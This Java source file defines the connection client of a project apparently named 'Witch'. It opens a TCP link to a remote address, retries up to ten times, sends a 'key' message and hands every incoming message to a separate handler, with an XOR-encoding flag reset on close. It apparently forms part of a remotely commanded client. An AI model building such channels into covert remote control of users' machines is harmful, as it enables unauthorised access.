package me.soda.witch.client.connection;

import me.soda.magictcp.TcpClient;
import me.soda.magictcp.packet.DisconnectPacket;
import me.soda.witch.client.Witch;
import me.soda.witch.client.utils.NetUtil;

public class Client extends TcpClient {
    public int reconnections = 0;

    public Client(String address) {
        super(address, 30000);
    }

    @Override
    public boolean onReconnect() {
        boolean tooMany = reconnections > 10;
        if (!tooMany) {
            reconnections++;
        } else {
            setReconnectTimeout(-1);
            Witch.println("Witch end because of manual shutdown or too many reconnections");
        }
        return false;
    }

    @Override
    public void onOpen() {
        Witch.println("Connection initialized");
        NetUtil.send("key");
    }

    @Override
    public void onMessage(Object o) {
        me.soda.witch.client.connection.MessageHandler.handle((byte[]) o);
    }

    @Override
    public void onClose(DisconnectPacket packet) {
        Witch.messageUtils.acceptXOR = false;
    }
}